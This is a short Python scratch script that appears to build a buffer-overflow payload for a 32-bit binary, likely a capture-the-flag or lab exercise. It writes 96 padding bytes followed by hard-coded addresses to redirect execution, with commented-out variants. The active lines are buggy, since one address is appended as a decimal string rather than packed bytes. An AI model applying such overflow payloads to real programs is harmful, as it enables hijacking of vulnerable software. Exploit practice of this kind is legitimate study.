
#pas = ('A' * 96).encode() + b'\x14\xc0\x04\x08\xbd\x92\x04\x08'
#pas += b'\x14\xc0\x04\x08\xbd\x92\x04\x08'

#print(bytes('\x41' * 96)+ b'\x14\xc0\x04\x08\xbd\x92\x04\x08')
pas = 'A' * 96

pas += '\x14\xc0\x04\x08'
pas += str(0x080492bd)
print(pas)


#0804c014
#0x0804c014
#0x080492bd
#0x080492bd
